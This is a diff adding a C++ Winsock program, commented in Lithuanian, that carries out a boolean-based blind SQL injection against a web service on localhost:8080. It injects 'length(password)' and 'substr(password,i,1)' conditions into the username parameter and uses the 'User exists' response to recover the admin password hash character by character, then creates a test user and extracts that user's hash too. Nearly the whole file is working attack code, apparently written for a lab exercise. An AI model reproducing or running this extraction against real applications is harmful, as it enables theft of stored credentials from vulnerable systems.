@@ -1,0 +1,232 @@
+#include <iostream>
+#include <string>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+
+#pragma comment(lib, "Ws2_32.lib")
+
+// Funkcija skirta URL užkoduoti
+std::string urlEncode(const std::string &s) {
+    std::string encoded;
+    for (char c: s) {
+        if (c == ' ') {
+            encoded += "%20";
+        } else {
+            encoded += c;
+        }
+    }
+    return encoded;
+}
+
+// Funkcija siunčianti HTTP užklausą ir grąžinanti atsakymą
+std::string sendHttpRequest(const std::string &method, const std::string &path, const std::string &content = "",
+                            const std::string &contentType = "") {
+    // Inicijuojama Winsock biblioteka
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    struct addrinfo *result = nullptr, *ptr = nullptr, hints;
+    std::string readBuffer;
+
+    // Inicijuojama Winsock versija 2.2
+    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        std::cerr << "WSAStartup failed with error: " << iResult << std::endl;
+        return "";
+    }
+
+    // Nustatome 'hints' struktūros reikšmes
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    // Gauname 'localhost' adreso informaciją
+    iResult = getaddrinfo("localhost", "8080", &hints, &result);
+    if (iResult != 0) {
+        std::cerr << "getaddrinfo failed with error: " << iResult << std::endl;
+        WSACleanup();
+        return "";
+    }
+
+    // Sukuriame naują 'socket' ir jungiamės prie serverio
+    for (ptr = result; ptr != nullptr; ptr = ptr->ai_next) {
+        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (ConnectSocket == INVALID_SOCKET) {
+            std::cerr << "socket failed with error: " << WSAGetLastError() << std::endl;
+            WSACleanup();
+            return "";
+        }
+
+        iResult = connect(ConnectSocket, ptr->ai_addr, static_cast<int>(ptr->ai_addrlen));
+        if (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            ConnectSocket = INVALID_SOCKET;
+            continue;
+        }
+        break;
+    }
+
+    // Atlaisviname 'result' atmintį
+    freeaddrinfo(result);
+
+    // Patikriname ar prisijungėme prie serverio
+    if (ConnectSocket == INVALID_SOCKET) {
+        std::cerr << "Unable to connect to server!" << std::endl;
+        WSACleanup();
+        return "";
+    }
+
+    // Sukuriame HTTP užklausą ir siunčiame ją
+    std::string httpRequest = method + " " + urlEncode(path) + " HTTP/1.1\r\nHost: localhost\r\n";
+    if (!contentType.empty()) {
+        httpRequest += "Content-Type: " + contentType + "\r\n";
+    }
+    if (!content.empty()) {
+        httpRequest += "Content-Length: " + std::to_string(content.size()) + "\r\n\r\n" + content;
+    } else {
+        httpRequest += "Connection: close\r\n\r\n";
+    }
+
+    // Siunčiame užklausą
+    iResult = send(ConnectSocket, httpRequest.c_str(), httpRequest.length(), 0);
+    if (iResult == SOCKET_ERROR) {
+        std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return "";
+    }
+
+    // Spausdiname išsiųstą užklausą
+    std::cout << "Request sent:\n" << httpRequest << std::endl;
+
+    // Gavę atsakymą, skaitysime jį į 'readBuffer'
+    char buffer[512];
+    do {
+        iResult = recv(ConnectSocket, buffer, sizeof(buffer) - 1, 0);
+        if (iResult > 0) {
+            buffer[iResult] = 0;
+            readBuffer.append(buffer);
+        } else if (iResult == 0) {
+            break;
+        } else {
+            std::cerr << "recv failed with error: " << WSAGetLastError() << std::endl;
+            closesocket(ConnectSocket);
+            WSACleanup();
+            return "";
+        }
+    } while (iResult > 0);
+
+    // Spausdiname gautą atsakymą
+    std::cout << "Received response:\n" << readBuffer << std::endl;
+
+    // Uždarome 'socket' ir išvalome Winsock
+    closesocket(ConnectSocket);
+    WSACleanup();
+
+    // Grąžiname gautą atsakymą
+    return readBuffer;
+}
+
+// Funkcija naujam vartotojui sukurti
+bool createNewUser(const std::string &userName, const std::string &userFName, const std::string &userLName,
+                   const std::string &password) {
+    // Sukuriame JSON payload'ą
+    std::string jsonPayload =
+            R"({"userName":")" + userName + R"(","userFName":")" + userFName + R"(","userLName":")" + userLName +
+            R"(","password":")" + password + "\"}";
+    // Siunčiame POST užklausą naujam vartotojui sukurti
+    std::string response = sendHttpRequest("POST", "/users", jsonPayload, "application/json");
+
+    // Patikriname ar vartotojas sėkmingai sukurtas
+    if (response.find(R"({"result":"OK"})") != std::string::npos) {
+        return true;
+    } else {
+        return false;
+    }
+}
+
+// Funkcija, kuri ieško vartotojo slaptažodžio "hash'o"
+std::pair<int, std::string> findPasswordHash(const std::string &username) {
+    std::string hash;
+    std::string baseURL = "/users?username=";
+    std::string characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
+
+    int hashLength = 0;
+    // Nustatome slaptažodžio "hash" ilgį
+    while (true) {
+        std::string query = baseURL + username + "' and length(password) = '" + std::to_string(++hashLength);
+        std::string response = sendHttpRequest("GET", query);
+        if (response.empty()) {
+            std::cerr << "Error in sendHttpRequest, aborting..." << std::endl;
+            return std::make_pair(-1, "");
+        }
+        if (response.find("User exists") != std::string::npos) {
+            break;
+        }
+    }
+
+    // Spausdiname slaptažodžio "hash" ilgį
+    std::cout << "Password hash length for user " << username << ": " << hashLength << std::endl;
+
+    // Ieškome slaptažodžio "hash'o" simbolio po simbolio
+    for (int i = 0; i < hashLength; ++i) {
+        for (char c: characters) {
+            std::string query = baseURL + username + "' and substr(password," + std::to_string(i + 1) + ",1) = '" + c;
+            std::string response = sendHttpRequest("GET", query);
+            if (response.empty()) {
+                std::cerr << "Error in sendHttpRequest, aborting..." << std::endl;
+                return std::make_pair(-1, "");
+            }
+            if (response.find("User exists") != std::string::npos) {
+                hash.push_back(c);
+                break;
+            }
+        }
+    }
+
+    // Grąžiname slaptažodžio "hash" ilgį ir "hash'ą" kaip porą
+    return std::make_pair(hashLength, hash);
+}
+
+int main() {
+    std::string username = "admin";
+    // Ieškome slaptažodžio "hash'o"
+    std::pair<int, std::string> passwordHashInfo = findPasswordHash(username);
+    if (passwordHashInfo.first == -1) {
+        std::cerr << "Error occurred while finding the password hash, exiting..." << std::endl;
+        return 1;
+    }
+    // Spausdiname slaptažodžio "hash" ilgį ir "hash'ą"
+    std::cout << "Password hash length for user " << username << ": " << passwordHashInfo.first << std::endl;
+    std::cout << "Password hash for user " << username << ": " << passwordHashInfo.second << std::endl;
+
+    // Sukurkime naują vartotoją
+    std::string newUserUsername = "alex14";
+    std::string newUserFName = "Alexander";
+    std::string newUserLName = "Bob";
+    std::string newUserPassword = "guessme";
+
+    if (createNewUser(newUserUsername, newUserFName, newUserLName, newUserPassword)) {
+        std::cout << "New user " << newUserUsername << " created successfully" << std::endl;
+
+        // Randamas slaptažodžio "hash'as" naujam vartotojui
+        std::pair<int, std::string> newUserPasswordHashInfo = findPasswordHash(newUserUsername);
+        if (newUserPasswordHashInfo.first == -1) {
+            std::cerr << "Error occurred while finding the password hash for new user, exiting..." << std::endl;
+            return 1;
+        }
+        std::cout << "Password hash length for new user " << newUserUsername << ": " << newUserPasswordHashInfo.first
+                  << std::endl;
+        std::cout << "Password hash for new user " << newUserUsername << ": " << newUserPasswordHashInfo.second
+                  << std::endl;
+
+        std::cout << "Password hash length for current user " << username << ": " << passwordHashInfo.first
+                  << std::endl;
+        std::cout << "Password hash for current user " << username << ": " << passwordHashInfo.second << std::endl;
+
+    } else {
+        std::cerr << "Failed to create new user " << newUserUsername << std::endl;
+    }
+
+    return 0;
+}
